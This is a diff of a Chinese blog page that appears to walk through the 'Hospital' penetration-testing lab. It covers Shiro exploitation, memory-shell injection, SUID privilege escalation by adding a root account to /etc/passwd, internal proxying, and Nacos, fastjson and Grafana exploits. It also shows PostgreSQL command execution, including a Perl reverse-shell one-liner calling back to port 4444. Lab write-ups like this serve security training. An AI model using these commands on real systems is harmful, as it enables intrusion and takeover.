@@ -7,12 +7,12 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集 python dirsearch.py  -u 39.98.109.138:8080  可以看到有headump直接dump下来分析一波  存在shiro框架找到了shirokey 找漏洞利用工具弹shell 漏洞利用 直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接   suid提权 find &#x2F; -perm -u&#x3D;s -type f 2">
+    <meta name="description" content="信息收集python dirsearch.py  -u 39.98.109.138:8080   可以看到有headump直接dump下来分析一波   存在shiro框架找到了shirokey 找漏洞利用工具弹shell 漏洞利用直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接     suid提权find &#x2F; -perm -u&#x3D;s -type f">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hospital-春秋云镜">
 <meta property="og:url" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/index.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="信息收集 python dirsearch.py  -u 39.98.109.138:8080  可以看到有headump直接dump下来分析一波  存在shiro框架找到了shirokey 找漏洞利用工具弹shell 漏洞利用 直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接   suid提权 find &#x2F; -perm -u&#x3D;s -type f 2">
+<meta property="og:description" content="信息收集python dirsearch.py  -u 39.98.109.138:8080   可以看到有headump直接dump下来分析一波   存在shiro框架找到了shirokey 找漏洞利用工具弹shell 漏洞利用直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接     suid提权find &#x2F; -perm -u&#x3D;s -type f">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202190540331.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202190919994.png">
@@ -28,8 +28,8 @@
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202200954886.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202201023456.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202201254878.png">
-<meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/Hospital/IMAGE20250202201247123.png">
-<meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/Hospital/IMAGE20250202201642615.png">
+<meta property="og:image" content="https://oceanzbz.github.io/Hospital/IMAGE20250202201247123.png">
+<meta property="og:image" content="https://oceanzbz.github.io/Hospital/IMAGE20250202201642615.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202202028087.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202203044397.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202203157646.png">
@@ -163,7 +163,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">4.1.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">Grafana文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql-getshell"><span class="toc-number">4.4.</span> <span class="toc-text">postgresql getshell</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">4.1.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">Grafana文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql-getshell"><span class="toc-number">4.4.</span> <span class="toc-text">postgresql getshell</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -213,84 +213,86 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="信息收集">信息收集</h2>
-<p><code>python dirsearch.py  -u 39.98.109.138:8080</code></p>
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>python dirsearch.py  -u 39.98.109.138:8080</code></p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202190540331.png" class="">
+
 <p>可以看到有headump直接dump下来分析一波</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202190919994.png" class="">
+
 <p>存在shiro框架找到了shirokey 找漏洞利用工具弹shell</p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接使用shiro漏洞利用工具反弹shell或者注入内存马都行，这里直接注入冰蝎内存马，然后连接</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202191444708.png" class="">
+
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202191521903.png" class="">
-<h2 id="suid提权">suid提权</h2>
-<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202191646207.png" class="">
-<p>利用vim.basic查看文件<br>
-<code>vim.basic /root/flag/flag01.txt</code></p>
+
+<p>利用vim.basic查看文件<br><code>vim.basic /root/flag/flag01.txt</code></p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202192057091.png" class="">
 <p>有了这个能编辑文件加个特权账户,使用pwncat终端重新接收shell</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202195249191.png" class="">
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">back                                                      #返回shell  </span><br><span class="line">vim.basic /etc/passwd                                     #利用提权文件编辑passwd文件  </span><br><span class="line">i                                                         #进入编辑模式  </span><br><span class="line">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash  #创建用户hacker/123456  </span><br><span class="line">wq!                                                       #强制保存退出  </span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure>
-<h2 id="内网渗透">内网渗透</h2>
-<p>上传fscan 扫描内网</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>上传fscan 扫描内网</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202192653282.png" class="">
-<p>内网存在一个 nacos漏洞下载漏洞利用工具<a target="_blank" rel="noopener" href="https://github.com/charonlight/NacosExploitGUI">charonlight/NacosExploitGUI</a>。编辑NacosExploitGUI-main\漏洞复现环境\nacos-client_yaml_deserialize\yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java</p>
+
+<p>内网存在一个 nacos漏洞下载漏洞利用工具<a target="_blank" rel="noopener" href="https://github.com/charonlight/NacosExploitGUI">charonlight&#x2F;NacosExploitGUI</a>。编辑NacosExploitGUI-main\漏洞复现环境\nacos-client_yaml_deserialize\yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202195705638.png" class="">
 <p>修改其文件为添加管理员用户</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202200123539.png" class="">
 <p>根据他的bat里的命令重新编译一下会生成一个jar包，用冰蝎把它上传到受害机，然后用python开一个服务利用漏洞利用工具进行利用。</p>
-<h3 id="内网穿透">内网穿透</h3>
-<p>在利用之前先把代理搭起来用Stowaway<br>
-攻击端</p>
+<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>在利用之前先把代理搭起来用Stowaway<br>攻击端</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202200935647.png" class="">
 <p>受害端</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202200954886.png" class="">
 <p>搭建socks代理</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202201023456.png" class="">
-<h3 id="漏洞利用-2">漏洞利用</h3>
-<p>然后在tmp目录下起一个http服务结合漏洞利用框架进行利用</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>然后在tmp目录下起一个http服务结合漏洞利用框架进行利用</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202201254878.png" class="">
-<p><img src="Hospital/IMAGE20250202201247123.png" alt=""><img src="Hospital/IMAGE20250202201642615.png" alt=""><br>
-看看能否直接rdp上去</p>
+<p><img src="/Hospital/IMAGE20250202201247123.png"><img src="/Hospital/IMAGE20250202201642615.png"><br>看看能否直接rdp上去</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202202028087.png" class="">
+
 <p>拿到第二个flag</p>
 <p>前面在fscan扫描的时候还看到一个172.30.12.236:8080开启了一个服务访问看看，抓包</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202203044397.png" class="">有json特征应该是是fastjson漏洞，测试一下发现了
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202203157646.png" class="">
+
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202203737545.png" class="">
+
 <p>使用插件可以直接执行命令，拿到第三个flag</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202203902865.png" class="">
+
 <p>执行ifconfig发现还存在内网，继续利用该插件注入内存马</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202204919349.png" class="">
 <p>可以发现是双网卡，在搭一层二级代理</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202205946488.png" class="">
-<h3 id="Grafana文件读取漏洞">Grafana文件读取漏洞</h3>
-<p>搭建成功。然后我们继续上传fscan去扫描 54这个网段</p>
+
+<h3 id="Grafana文件读取漏洞"><a href="#Grafana文件读取漏洞" class="headerlink" title="Grafana文件读取漏洞"></a>Grafana文件读取漏洞</h3><p>搭建成功。然后我们继续上传fscan去扫描 54这个网段</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.54.179/24  </span><br><span class="line">  </span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __  </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /  </span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\  </span><br><span class="line">                     fscan version: 1.8.3  </span><br><span class="line">start infoscan  </span><br><span class="line">(icmp) Target 172.30.54.179   is alive  </span><br><span class="line">(icmp) Target 172.30.54.12    is alive  </span><br><span class="line">[*] Icmp alive hosts len is: 2  </span><br><span class="line">172.30.54.179:8080 open  </span><br><span class="line">172.30.54.12:22 open  </span><br><span class="line">172.30.54.179:22 open  </span><br><span class="line">172.30.54.12:5432 open  </span><br><span class="line">172.30.54.12:3000 open  </span><br><span class="line">172.30.54.179:8009 open  </span><br><span class="line">[*] alive ports len is: 6  </span><br><span class="line">start vulscan  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login  </span><br><span class="line">[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root root@111 ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root 1qaz2wsx ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.12:22 root 1qaz!QAZ ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin admin123 ssh: handshake failed: ssh: u  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1234567890 ssh: handshake failed: ssh:  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1q2w3e ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 6/6  </span><br><span class="line">[*] 扫描结束,耗时: 6m48.2826514s</span><br></pre></td></tr></table></figure>
+
 <p>可以看到存在一个服务访问一下</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202210259226.png" class="">
-<p>存在Grafana文件读取漏洞（CVE-2021-43798）<br>
-<a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">https://github.com/A-D-Team/grafanaExp</a> 漏洞利用工具下载下来上传到受控机器然后执行</p>
+
+<p>存在Grafana文件读取漏洞（CVE-2021-43798）<br><a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">https://github.com/A-D-Team/grafanaExp</a> 漏洞利用工具下载下来上传到受控机器然后执行</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202213631161.png" class="">
-<h3 id="postgresql-getshell">postgresql getshell</h3>
-<p>获取到用户名和密码直接navicat连接查询</p>
+<h3 id="postgresql-getshell"><a href="#postgresql-getshell" class="headerlink" title="postgresql getshell"></a>postgresql getshell</h3><p>获取到用户名和密码直接navicat连接查询</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202213708787.png" class="">
-<p>直接修改密码<code>ALTER USER root WITH PASSWORD '123456';</code>然后反弹shell</p>
-<p><code>PostgreSQL &lt;= 8.1</code> 可以通过调用系统的动态链接库 <code>libc.so.6</code> 来实现命令执行<br>
-参考：<br>
-<a target="_blank" rel="noopener" href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a><br>
-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/79032774">https://blog.csdn.net/qq_33020901/article/details/79032774</a></p>
+
+<p>直接修改密码<code>ALTER USER root WITH PASSWORD &#39;123456&#39;;</code>然后反弹shell</p>
+<p><code>PostgreSQL &lt;= 8.1</code> 可以通过调用系统的动态链接库 <code>libc.so.6</code> 来实现命令执行<br>参考：<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/79032774">https://blog.csdn.net/qq_33020901/article/details/79032774</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT; select system(&#x27;curl 172.30.54.179&#x27;);</span><br><span class="line"></span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202215533978.png" class="">
+
 <p>然后提权</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202215639725.png" class="">
+
 <p>直接连接输入 <code>\?</code>之后在输入<code>!/bin/bash</code>就可以到root权限了直接读flag文件</p>
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202215754200.png" class="">
 <img src="/2025/02/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Hospital/IMAGE20250202215802600.png" class="">
-<p>参考：<br>
-<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA">https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA</a><br>
-<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/">https://fushuling.com/index.php/2024/01/06/春秋云境-hospital/</a></p>
+
+<p>参考：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA">https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA</a><br><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/">https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/</a></p>
 
   </div>
 </article>
@@ -330,7 +332,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">4.1.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">Grafana文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql-getshell"><span class="toc-number">4.4.</span> <span class="toc-text">postgresql getshell</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">4.1.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">Grafana文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql-getshell"><span class="toc-number">4.4.</span> <span class="toc-text">postgresql getshell</span></a></li></ol></li></ol>
       </div>
     
 
